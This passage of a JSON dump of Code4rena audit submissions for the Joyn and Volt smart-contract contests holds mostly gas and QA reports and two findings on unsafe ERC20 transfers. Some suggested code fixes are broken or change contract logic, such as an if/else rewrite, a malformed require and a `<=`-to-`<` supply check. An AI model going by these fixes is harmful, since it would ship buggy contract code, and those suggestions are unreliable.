      "url": "https://github.com/code-423n4/2022-03-joyn-findings/issues/124"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "1. Using short reason string can be used for saving more gas\n\nEvery reason string takes at least 32 bytes. Use short reason strings that fits in 32 bytes or it will become more expensive.\n\n##Tool Used\nManual Review \n\nOccurance :\n```\nCoreCollection.sol\nCoreFactory.sol\nERC721Claimable.sol\nRoyaltyVault.sol\n```\n\n2. Set `uint i ` for saving gas\n\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/CoreCollection.sol#L279\n\n##Tool Used\nManual Review\n\n#POC\n\nit unnecessary value set. the default value of uint is zero, so that implementation below can be used for saving gas. , so it can be set  `uint i` instead of `uint i = 0`\n\n##Occurance \nThis was another occurance\n```\ncore-contracts/contracts/Splitter.sol#L50\ncore-contracts/contracts/Splitter.sol#L274\ncore-contracts/contracts/MultiSigWallet.sol#L98\ncore-contracts/contracts/MultiSigWallet.sol#L127\ncore-contracts/contracts/MultiSigWallet.sol#L147\ncore-contracts/contracts/MultiSigWallet.sol#L268\ncore-contracts/contracts/MultiSigWallet.sol#L314\ncore-contracts/contracts/MultiSigWallet.sol#L330\n```\n\n3.  Using ++i instead i++ for saving more gas\n\nUsing i++ instead ++i for  all the loops, the variable i is incremented using i++. It is known that implementation by using ++i costs less gas per iteration than i++.\n\n## Tools Used\nManual Review\n\n## Occurances\n\n```\ncore-contracts/contracts/CoreCollection.sol#L279\ncore-contracts/contracts/CoreFactory.sol#L79\ncore-contracts/contracts/MultiSigWallet.sol#L127\ncore-contracts/contracts/MultiSigWallet.sol#L147\n```\n\n4. Using `calldata` instead of `memory` for saving gas\n\nhttps://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/core-contracts/contracts/CoreFactory.sol#L72\ninstead of caching in `memory`, it better to used `calldata` .\n\nDeployment Core Factory  1202872 before  \t\t\t\n                                             1192707 after    \n\n##Tool Used \nManual Review, Visual Studio Code\n\n##Recommendation Mitigation\n```\n    Collection[] calldata _collections\n```\n\n5. using if else condition for saving more gas\n\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/CoreCollection.sol#L303-L308\nthis implementation below can be used for saving more gas\n\nDeploy CoreCollection  3070877 before\n\t\t\t               3070229 after\t\n\n##Tool used\nVisual Studio Code & Manual Review \n\n##Recommended Mitigation Steps\n\n```\nif (royaltyVault != address(0) &&\n            IRoyaltyVault(royaltyVault).getVaultBalance() > 0\n        ) {\n            IRoyaltyVault(royaltyVault).sendToSplitter();\n        }\n```\n\nchange to\n\n```\n if (royaltyVault != address(0)){\n        }else{   \n            IRoyaltyVault(royaltyVault).getVaultBalance() > 0;\n        }\n            IRoyaltyVault(royaltyVault).sendToSplitter();\n        }\n```\n\n6.  Using `>` instead of `>=` for saving more gas\n\nhttps://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/core-contracts/contracts/CoreMultiSig.sol#L21\n\n##Impact \nexpensive gas\n\n##Tool Used\nVisual Studio Code\n\n##Recommendation Mitigation Steps\nuse `>`\n\n7. Goodway to use `SafeERC20` function for saving more gas \n\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/CoreMultiSig.sol\n\n##Impact\nExpensive gas\n\n##POC\nhttps://docs.openzeppelin.com/contracts/3.x/api/token/erc20#SafeERC20\n\n##Tool Used\nManual Review\n\n##Reccomendation Mitigation Steps\nby do not declaring `using SafeERC20 for IERC20;` and used `safeTransfer` \n\n8. Value can be set as `immutable` for saving gas\n\n##Impact \nExpensive gas\n\n##POC\nhttps://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/royalty-vault/contracts/ProxyVault.sol#L9\nthis value can be set as immutable for saving gas.\n\n##Tool Used\nVisual Studio Code\n\n##Recommendation Mitigation\n\n`address internal immutable royaltyVault;`\n\n9. Value can be set as `constant` for saving gas \n\n##Impact \nExpensive gas\n\n##POC \n\nhttps://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/royalty-vault/contracts/RoyaltyVaultFactory.sol#L27-L28\nsince `platformFee` and `platformFeeRecipient` was set, it can be set as constant instead, for saving gas.\n\n##Tool Used\nVisual Studio Code \n\n##Recommended Mitigation\n`platformFee` and `platformFeeRecipient` set as `constant`\n\n",
    "dataSource": {
      "name": "code-423n4/2022-03-joyn-findings",
      "repo": "https://github.com/code-423n4/2022-03-joyn-findings",
      "url": "https://github.com/code-423n4/2022-03-joyn-findings/issues/119"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "gas\n\n#1 Unused `onlyUnInitialized` modifier\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/CoreCollection.sol#L46\nThe `onlyUnInitialized` was never called everywhere. Just remove the modifier\n\n\n#2 Using `calldata` to store string as a parameter\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/CoreCollection.sol#L79-L81\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/CoreCollection.sol#L122-L123\nBy using `calldata` to store `_collectionName` `_collectionSymbol` and `_collectionURI` can save gas when running `initialize()`\n\n\n#3 Using != instead of >\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/CoreCollection.sol#L146\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/CoreCollection.sol#L305\nUsing != is more effective for gas improvement\n\n\n#4 Gas improvement by not setting uint = 0\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/CoreCollection.sol#L279\nUint has  a default value 0. By just declare it without setting the value can save gas\n\n\n#5 Prefix increment and unchecked for gas improvement\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/CoreCollection.sol#L279\nUsing ++i for increment instead of i++ can save gas. Then use `unchecked` to do the increment:\n```\nfor (uint256 i = 0; i < _amount;) {\n            uint256 tokenId = mint(_to);\n            if (_isClaim) {\n                emit NewClaim(msg.sender, _to, tokenId);\n            }\nUnchecked{\n\t++i\n}\n        }\n``` \n\n\n#6 Don't set string default value\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/CoreCollection.sol#L27\nDeclaring `HASHED_PROOF` without setting it the value can save gas\n\n\n#7 Remove `_beforeTokenTransfer` call in the `_beforeTokenTransfer` function\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/CoreCollection.sol#L301\n`_beforeTokenTransfer` function (parent contract) is an empty function. Just remove L301 to save gas\n\n\n\n#8 Using custom error instead of revert string\nCustom error is declared with error statement. Then replace all the `require(condition, 'revertString')` with if(condition) revert(error)\n\n\n#9 Using `calldata` to store array parameter value\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/CoreFactory.sol#L72\nBy using `calldata` to store `_collections` can save gas\n\n\n#10 Use storage to store _collection\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/CoreFactory.sol#L80\nIf var amount inside struct >= struct called times, using storage is way cheaper:\n```\n   Collection storage _collection = _collections[I]; //@audit-info change memory to storage\n```\nSame thing for project at L93\n\n\n#11 Better implementation of calling `SafeERC20.function`\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/CoreMultiSig.sol#L10\nBy removing L10, and calling `SafeERC20.function`:\n[L10](https://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/CoreMultiSig.sol#L22)\n```\nSafeERC20.safeTransfer(IERC20(token), to, amount)\n```\nCan save 15 gas per call\n\n\n#12 Tight variable packing in `Collection` struct\nhttps://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/core-contracts/contracts/utils/structs/Collection.sol\nBy placing `isForSale` bool under `payableToken` address can save 1 slot\n\n\n#13 Using multiple require is more effective than &&\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/MultiSigWallet.sol#L99\nChange the code to:\n```\n            require(!isOwner[_owners[i]]);\n            require(!isOwner[_owners[i] != address(0));\n```\n\n\n#14 Tight variable packing in `Transaction` struct\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/MultiSigWallet.sol#L32-L37\nBy moving `destination` location above `executed` can save 1 slot\n```\n    struct Transaction {\n        uint256 value;\n        bytes data;\n\taddress destination;//@audit-info move here\n        bool executed;\n    }\n```\n\n\n#15 Using `delete` statement instead of setting value to `false`\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/MultiSigWallet.sol#L152\nBy using delete to set mapping to default value (false) can save gas:\n```\nDelete isOwner[owner];\n```\nAlso:\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/MultiSigWallet.sol#L206\n",
    "dataSource": {
      "name": "code-423n4/2022-03-joyn-findings",
      "repo": "https://github.com/code-423n4/2022-03-joyn-findings",
      "url": "https://github.com/code-423n4/2022-03-joyn-findings/issues/113"
    }
  },
  {
    "title": "QA Report",
    "body": "# QA Report\n\n## Low Issues\n\n### Unsafe ERC20 transfers\n\nERC20 operations can be unsafe due to different implementations and\nvulnerabilities in the standard.\n\nIt is therefore recommended to always either use OpenZeppelin's SafeERC20\nlibrary or at least to wrap each operation in a require statement.\n\nFollowing functions have unsafe ERC20 transfers:\n- CoreCollection::withdraw\n- ERC721Payable::_handlePayment\n\n### Missing upper limit for platform fee\n\nThe platform fee can be set to arbitraty values in the `RoyaltyVault::setPlatformFee`\nfunction. The highest logical value is 10,000 = 100%.\n\nConsider introducing an upper limit for the platform fee through a `require` statement.\n\nNote that it's recommended to set the upper limit far lower than 100% to disable\nrug vectors.\n\n### Issues with comments\n\nThe `Splitter::transferSplitAsset` function has a faulty comment stating\n`// Try to transfer ETH to the given recipient.`, eventhough an ERC20 token is\ntransfered. The error message in case of failure is off too.\n\nA parameter document for function `RoyaltyVaultFactory::setPlatformFee`\nstates `5% = 200` as example for the percentage scale. This conversion rate\nis false.\n\n## Gas Optimizations\n\n### Don't Initialize Variables with Default Value\n\nIssue Information: [G001](https://github.com/byterocket/c4-common-issues/blob/main/0-Gas-Optimizations.md#g001---dont-initialize-variables-with-default-value)\n\n#### Findings:\n```\ncore-contracts/contracts/CoreCollection.sol::280 => for (uint256 i = 0; i < _amount; i++) {\nsplits/contracts/Splitter.sol::52 => uint256 amount = 0;\nsplits/contracts/Splitter.sol::53 => for (uint256 i = 0; i < currentWindow; i++) {\nsplits/contracts/Splitter.sol::278 => for (uint256 i = 0; i < proof.length; i++) {\n```\n#### Tools used\n[c4udit](https://github.com/byterocket/c4udit)\n\n### Cache Array Length Outside of Loop\n\nIssue Information: [G002](https://github.com/byterocket/c4-common-issues/blob/main/0-Gas-Optimizations.md#g002---cache-array-length-outside-of-loop)\n\n#### Findings:\n```\ncore-contracts/contracts/CoreFactory.sol::79 => for (uint256 i; i < _collections.length; i++) {\nsplits/contracts/Splitter.sol::278 => for (uint256 i = 0; i < proof.length; i++) {\n```\n#### Tools used\n[c4udit](https://github.com/byterocket/c4udit)\n\n### Long Revert Strings\n\nIssue Information: [G007](https://github.com/byterocket/c4-common-issues/blob/main/0-Gas-Optimizations.md#g007---long-revert-strings)\n\n#### Findings:\n```\ncore-contracts/contracts/CoreCollection.sol::47 => require(!initialized, \"CoreCollection: Already initialized\");\ncore-contracts/contracts/CoreCollection.sol::146 => require(amount > 0, \"CoreCollection: Amount should be greater than 0\");\ncore-contracts/contracts/CoreCollection.sol::192 => \"CoreCollection: Only Split Factory or owner can initialize vault.\"\ncore-contracts/contracts/CoreCollection.sol::207 => \"CoreCollection: Hashed Proof is set\"\ncore-contracts/contracts/CoreCollection.sol::223 => \"CoreCollection: Starting index is already set\"\nroyalty-vault/contracts/RoyaltyVault.sol::36 => \"Vault does not have enough royalty Asset to send\"\nroyalty-vault/contracts/RoyaltyVault.sol::45 => \"Failed to transfer royalty Asset to splitter\"\nroyalty-vault/contracts/RoyaltyVault.sol::49 => \"Failed to increment splitter window\"\nroyalty-vault/contracts/RoyaltyVault.sol::56 => \"Failed to transfer royalty Asset to platform fee recipient\"\nsplits/contracts/Splitter.sol::123 => \"NFT has already claimed the given window\"\n```\n#### Tools used\n[c4udit](https://github.com/byterocket/c4udit)\n\n### Unspecific Compiler Version Pragma\n\nIssue Information: [L003](https://github.com/byterocket/c4-common-issues/blob/main/2-Low-Risk.md#l003---unspecific-compiler-version-pragma)\n\nAll contracts use a floating pragma. Consider specifying a concrete solidity version\nfor non-interface contracts.\n\n#### Tools used\n[c4udit](https://github.com/byterocket/c4udit)\n",
    "dataSource": {
      "name": "code-423n4/2022-03-joyn-findings",
      "repo": "https://github.com/code-423n4/2022-03-joyn-findings",
      "url": "https://github.com/code-423n4/2022-03-joyn-findings/issues/106"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "1. `!=0` more effective than `< 0`\n\nProof of Concept:\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/CoreCollection.sol#L146\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/CoreCollection.sol#L161\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/CoreFactory.sol#L74-L77\n\nRecommended Mitigation Steps:\nChange `> 0` or `< 0` to `!= 0`\n\n========================================================================\n\n2. unnecessary value set. the default value of uint is zero.\n\nProof of Concept:\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/MultiSigWallet.sol#L267\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/MultiSigWallet.sol#L98\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/CoreCollection.sol#L279\n\nRecommended Mitigation Steps:\nremove 0\n\n========================================================================\n\n3. using `++i` can save gas\n\nProof of Concept:\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/CoreCollection.sol#L279\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/CoreFactory.sol#L79\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/MultiSigWallet.sol#L98\n\nRecommended Mitigation Steps:\nchange i++ to ++i\n\n========================================================================\n\n4. Using < is cheaper than <=\n\nProof of Concept:\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/CoreCollection.sol#L147-L150\n\nRecommended Mitigation Steps:\nChange from `<=` to `<`\n```\nrequire(\n            totalSupply() + amount < maxSupply,\n            \"CoreCollection: Over Max Supply\"\n        );\n```\n\n========================================================================\n\n5. Caching `.length` for loop\n\nProof of Concept:\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/CoreFactory.sol#L79\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/MultiSigWallet.sol#L98\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/MultiSigWallet.sol#L147\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/MultiSigWallet.sol#L268\n\nRecommended Mitigation Steps:\n```\nuint256 newVar = _collections.length;\nfor (uint256 i; i < newVar; i++)\n```\nby caching `_collections.length` to `newVar` can save gas\n\n========================================================================\n\n6. the best way to use `SafeERC20.function` for gas opt\n\nProof of Concept:\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/CoreMultiSig.sol#L10\n\nRecommended Mitigation Steps:\nby not declaring:\n```\nusing SafeERC20 for IERC20;\n```\n\nand use:\n```\nSafeERC20.safeTransfer(IERC20(token), to, amount);\n```\n\n========================================================================\n\n7. Using `== true` cost more gas\n\nProof of Concept:\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/royalty-vault/contracts/RoyaltyVault.sol#L43-L57\n\nRecommended Mitigation Steps:\nUsing `== true` to validate bool variable is unnecessary:\n```\nrequire(\n            IERC20(royaltyAsset).transfer(splitterProxy, splitterShare),\n            \"Failed to transfer royalty Asset to splitter\"\n        );\n```\n\n========================================================================\n\n8. Using `calldata` to store struct data type can save gas\n\nProof of Concept:\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/CoreFactory.sol#L72\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/CoreFactory.sol#L80\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/CoreFactory.sol#L110\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/CoreFactory.sol#L142\n\nRecommended Mitigation Steps:\nChange to:\n```\nCollection[] calldata _collections\n```\n\n========================================================================",
    "dataSource": {
      "name": "code-423n4/2022-03-joyn-findings",
      "repo": "https://github.com/code-423n4/2022-03-joyn-findings",
      "url": "https://github.com/code-423n4/2022-03-joyn-findings/issues/99"
    }
  },
  {
    "title": "QA Report",
    "body": "# LOW\n\n### Low#1: Use `safeTransferFrom` instead of `transferFrom` or implement bool check.\n\n[CoreCollection.withdraw](https://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/CoreCollection.sol#L173-L177)\nFailure to check if `transferFrom` might result in silent failures of transfers.\nI recommend using something like [OpenZeppelin’s safeTransfer/safeTransferFrom](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/utils/SafeERC20.sol) or introducing a require() statement that checks the return value of token transfers.\n\n### Low+Gas#2: Initializing variable to default value is unnecessary and using a prefix(++i) is more efficient than using a postfix(i++)\n\n[CoreCollection.batchmint](https://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/CoreCollection.sol#L274-L285)\n\nSuggest changing from this:\n\n```\nfor (uint256 i = 0; i < _amount; i++) {\n            uint256 tokenId = mint(_to);\n            if (_isClaim) {\n                emit NewClaim(msg.sender, _to, tokenId);\n            }\n        }\n```\n\nTo this:\n\n```\nfor (uint256 i; i < _amount; ++i) {\n            uint256 tokenId = mint(_to);\n            if (_isClaim) {\n                emit NewClaim(msg.sender, _to, tokenId);\n            }\n        }\n```\n\nNote: There is a duplicate of the gas part in the gas report, but I thought it would be more neat to show both changes together.\n\n### Low#3: No zero address checks in `constructor`.\n\n[CoreFactory.constructor](https://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/CoreFactory.sol#L27-L30)\n\nA new contract will have to be launched if `_collection` or `_splitFactory` are set to zero by mistake as there are no other ways to change them.",
    "dataSource": {
      "name": "code-423n4/2022-03-joyn-findings",
      "repo": "https://github.com/code-423n4/2022-03-joyn-findings",
      "url": "https://github.com/code-423n4/2022-03-joyn-findings/issues/97"
    }
  },
  {
    "title": "QA Report",
    "body": "- incorrect revert msg and comment in `Splitter.transferSplitAsset` as the function is transfering ERC20 token and not ETH.\n- All contracts use an unlocked pragma ^0.8.4.",
    "dataSource": {
      "name": "code-423n4/2022-03-joyn-findings",
      "repo": "https://github.com/code-423n4/2022-03-joyn-findings",
      "url": "https://github.com/code-423n4/2022-03-joyn-findings/issues/86"
    }
  },
  {
    "title": "ERC20 tokens with no return value will fail to transfer",
    "severity": "major",
    "body": "# Lines of code\n\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/royalty-vault/contracts/RoyaltyVault.sol#L43-L46\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/royalty-vault/contracts/RoyaltyVault.sol#L51-L57\n\n\n# Vulnerability details\n\n Although the ERC20 standard suggests that a transfer should return true on success, many tokens are non-compliant in this regard (including high profile, like USDT) . In that case, the .transfer() call here will revert even if the transfer is successful, because solidity will check that the RETURNDATASIZE matches the ERC20 interface.\n\nRecommendation: Consider using OpenZeppelin’s SafeERC20\n\n",
    "dataSource": {
      "name": "code-423n4/2022-03-joyn-findings",
      "repo": "https://github.com/code-423n4/2022-03-joyn-findings",
      "url": "https://github.com/code-423n4/2022-03-joyn-findings/issues/83"
    }
  },
  {
    "title": "Funds cannot be withdrawn in `CoreCollection.withdraw`",
    "severity": "major",
    "body": "# Lines of code\n\nhttps://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/CoreCollection.sol#L175\n\n\n# Vulnerability details\n\n The `CoreCollection.withdraw` function uses `payableToken.transferFrom(address(this), msg.sender, amount)` to transfer tokens from the `CoreCollection` contract to the `msg.sender` ( who is the owner of the contract). The usage of `transferFrom` can result in serious issues. In fact, many ERC20 always require that in `transferFrom` `allowance[from][msg.sender] >= amount`, so in this case the call to the `withdraw` function will revert as the `allowance[CoreCollection][CoreCollection] == 0` and therefore the funds cannot ben withdrawn and will be locked forever in the contract.\n\nRecommendation : replace `transferFrom` with `transfer`\n\n",
    "dataSource": {
      "name": "code-423n4/2022-03-joyn-findings",
      "repo": "https://github.com/code-423n4/2022-03-joyn-findings",
      "url": "https://github.com/code-423n4/2022-03-joyn-findings/issues/80"
    }
  },
  {
    "title": "QA Report",
    "body": "2022-03-volt\n\n\n1 delete unused import statement.\n\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/pcv/compound/CompoundPCVDepositBase.sol#L6\n\nDelete the line.\n\n\n2 update event error message which is related to FEI. The following event error messages include the name FEI. These messages must be updated.\n\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/volt/Volt.sol#L92\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/volt/Volt.sol#L72\n\nrequire(deadline >= block.timestamp, \"Volt: EXPIRED\");\nrequire(recoveredAddress != address(0) && recoveredAddress == owner, \"Volt: INVALID_SIGNATURE\");\n\n\n3 change the following comment. The following comment has the wrong description. It must be changed.\n\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/core/Core.sol#L14 \n\n/// @notice the address of the VOLT contract\n\n\n4 Use mixedCase for the immutable state variable. All capital letters will be used for constants. The following state variable is immutable, so mixedCase.\n\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/utils/RateLimited.sol#L11\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/utils/RateLimited.sol#L52\n\nuint256 public immutable maxRateLimitPerSecond;\n\n\n5 check whether the value is under 112 bits or not. The following line try to convert uint from 256 to 112. Like safeCast.sol of openzeppelin the validation must be checked with require statement. \n\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/utils/MultiRateLimited.sol#L172-L173\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/utils/MultiRateLimited.sol#L216-L222\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/utils/MultiRateLimited.sol#L340-L342\n\nrequire(individualMaxRateLimitPerSecond <= type(uint112).max, \"SafeCast: value doesn't fit in 112 bits\");\nrequire(individualMaxBufferCap <= type(uint112).max, \"SafeCast: value doesn't fit in 112 bits\");\n\nrequire(newBuffer - amount <= type(uint112).max, \"SafeCast: value doesn't fit in 112 bits\");\n\n\n6 Lock pragmas to specific compiler version. Contracts should be deployed with the same compiler version and flags that they have been tested with thoroughly. Locking the pragma helps to ensure that contracts do not accidentally get deployed using, for example, an outdated compiler version that might introduce bugs that affect the contract system negatively.\n\npragma solidity 0.8.4;\n\n\n7 check input validation in withdrawERC20. Param amount must be checked if it is 0 or not.\n\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/peg/NonCustodialPSM.sol#L201-L206\n\nrequire(amount != 0, “Invalid amount”);\n\n\n8 the wrong local variable name. The following local variable name makes the user confused.\n\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/peg/NonCustodialPSM.sol#L286\nhttps://github.com/code-423n4/2022-03-volt/blob/main/contracts/peg/NonCustodialPSM.sol#L290\n\n\nuint256 amountVoltToTransfer = Math.min()\nuint256 amountVoltToMint = amountVoltOut - amountFeiToTransfer;\n",
    "dataSource": {
      "name": "code-423n4/2022-03-volt-findings",
      "repo": "https://github.com/code-423n4/2022-03-volt-findings",
      "url": "https://github.com/code-423n4/2022-03-volt-findings/issues/122"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "# C4-001: Revert String Size Optimization\n\n## Impact\n\nShortening revert strings to fit in 32 bytes will decrease deploy time gas and will decrease runtime gas when the revert condition has been met.\n\nRevert strings that are longer than 32 bytes require at least one additional mstore, along with additional overhead for computing memory offset, etc.\n\n\n## Proof of Concept\n\nRevert strings > 32 bytes are here:\n\n```\n\nhttps://github.com/code-423n4/2022-03-volt/blob/cec24b859c69d1397ce4048b6e9b8e96410b31dd/contracts/oracle/ScalingPriceOracle.sol#L140\n\n  2022-03-volt-cec24b859c69d1397ce4048b6e9b8e96410b31dd/contracts/refs/CoreRef.sol::48 => \"CoreRef: Caller is not a PCV controller\"\n  2022-03-volt-cec24b859c69d1397ce4048b6e9b8e96410b31dd/contracts/refs/CoreRef.sol::56 => \"CoreRef: Caller is not a governor or contract admin\"\n  2022-03-volt-cec24b859c69d1397ce4048b6e9b8e96410b31dd/contracts/refs/CoreRef.sol::64 => \"CoreRef: Caller is not a governor\"\n  2022-03-volt-cec24b859c69d1397ce4048b6e9b8e96410b31dd/contracts/refs/CoreRef.sol::72 => \"CoreRef: Caller is not a guardian or governor\"\n  2022-03-volt-cec24b859c69d1397ce4048b6e9b8e96410b31dd/contracts/refs/CoreRef.sol::82 => \"CoreRef: Caller is not governor or guardian or admin\"\n```\n\n## Tools Used\n\nManual Review\n\n## Recommended Mitigation Steps\n\nShorten the revert strings to fit in 32 bytes. That will affect gas optimization.\n\n\n# C4-002 : Adding unchecked directive can save gas\n\n## Impact\n\nFor the arithmetic operations that will never over/underflow, using the unchecked directive (Solidity v0.8 has default overflow/underflow checks) can save some gas from the unnecessary internal over/underflow checks.\n\n## Proof of Concept\n\n```\nhttps://github.com/code-423n4/2022-03-volt/blob/cec24b859c69d1397ce4048b6e9b8e96410b31dd/contracts/volt/Volt.sol#L83\n```\n\n## Tools Used\n\nNone\n\n## Recommended Mitigation Steps\n\nConsider applying unchecked arithmetic where overflow/underflow is not possible.\n\n# C4-003 : Free gas savings for using solidity 0.8.10+\n\n## Impact\n\nUsing newer compiler versions and the optimizer gives gas optimizations and additional safety checks are available for free.\n\n## Proof of Concept\n\nSolidity 0.8.10 has a useful change which reduced gas costs of external calls which expect a return value: https://blog.soliditylang.org/2021/11/09/solidity-0.8.10-release-announcement/\n\nCode Generator: Skip existence check for external contract if return data is expected. In this case, the ABI decoder will revert if the contract does not exist\n\nAll Contracts\n\n## Tools Used\n\nNone\n\n## Recommended Mitigation Steps\n\nConsider to upgrade pragma to at least 0.8.10.\n\n# C4-004 :  Use `calldata` instead of `memory` for function parameters\n\n## Impact\n\nIn some cases, having function arguments in calldata instead of\nmemory is more optimal.\n\nConsider the following generic example:\n\n```\ncontract C {\nfunction add(uint[] memory arr) external returns (uint sum) {\nuint length = arr.length;\nfor (uint i = 0; i < arr.length; i++) {\nsum += arr[i];\n}\n}\n}\n```\nIn the above example, the dynamic array arr has the storage location\nmemory. When the function gets called externally, the array values are\nkept in calldata and copied to memory during ABI decoding (using the\nopcode calldataload and mstore). And during the for loop, arr[i]\naccesses the value in memory using a mload. However, for the above\nexample this is inefficient. Consider the following snippet instead:\n\n```\ncontract C {\nfunction add(uint[] calldata arr) external returns (uint sum) {\nuint length = arr.length;\nfor (uint i = 0; i < arr.length; i++) {\nsum += arr[i];\n}\n}\n}\n```\n\nIn the above snippet, instead of going via memory, the value is directly\nread from calldata using calldataload. That is, there are no\nintermediate memory operations that carries this value.\n\nGas savings: In the former example, the ABI decoding begins with\ncopying value from calldata to memory in a for loop. Each iteration\nwould cost at least 60 gas. In the latter example, this can be\ncompletely avoided. This will also reduce the number of instructions and\ntherefore reduces the deploy time cost of the contract.\n\nIn short, use calldata instead of memory if the function argument\nis only read.\n\nNote that in older Solidity versions, changing some function arguments\nfrom memory to calldata may cause \"unimplemented feature error\".\nThis can be avoided by using a newer (0.8.*) Solidity compiler.\n\nExamples\nNote: The following pattern is prevalent in the codebase:\n\n```\nfunction f(bytes memory data) external {\n(...) = abi.decode(data, (..., types, ...));\n}\n```\n\nHere, changing to bytes calldata will decrease the gas. The total\nsavings for this change across all such uses would be quite\nsignificant.\n\n\n## Proof Of Concept\n\nExamples:\n\n```\nhttps://github.com/code-423n4/2022-03-volt/blob/cec24b859c69d1397ce4048b6e9b8e96410b31dd/contracts/refs/OracleRef.sol#L84\n```\n\n## Tools Used\n\nNone\n\n## Recommended Mitigation Steps\n\nChange memory definition with calldata.\n\n# C4-005 : Non-strict inequalities are cheaper than strict ones\n\n## Impact\n\nStrict inequalities add a check of non equality which costs around 3 gas.\n\n## Proof of Concept\n\n```\nhttps://github.com/code-423n4/2022-03-volt/blob/cec24b859c69d1397ce4048b6e9b8e96410b31dd/contracts/oracle/ScalingPriceOracle.sol#L140\n```\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nUse >= or <= instead of > and < when possible.\n\n# C4-006: Use of constant keccak variables results in extra hashing (and so gas).\n\n## Impact\n\nThat would Increase gas costs on all privileged operations.\n\n## Proof of Concept\n\nThe following role variables are marked as constant.\n\n```\n  2022-03-volt-cec24b859c69d1397ce4048b6e9b8e96410b31dd/contracts/core/Permissions.sol::10 => bytes32 public constant override BURNER_ROLE = keccak256(\"BURNER_ROLE\");\n  2022-03-volt-cec24b859c69d1397ce4048b6e9b8e96410b31dd/contracts/core/Permissions.sol::11 => bytes32 public constant override MINTER_ROLE = keccak256(\"MINTER_ROLE\");\n  2022-03-volt-cec24b859c69d1397ce4048b6e9b8e96410b31dd/contracts/core/Permissions.sol::13 => keccak256(\"PCV_CONTROLLER_ROLE\");\n  2022-03-volt-cec24b859c69d1397ce4048b6e9b8e96410b31dd/contracts/core/Permissions.sol::14 => bytes32 public constant override GOVERN_ROLE = keccak256(\"GOVERN_ROLE\");\n  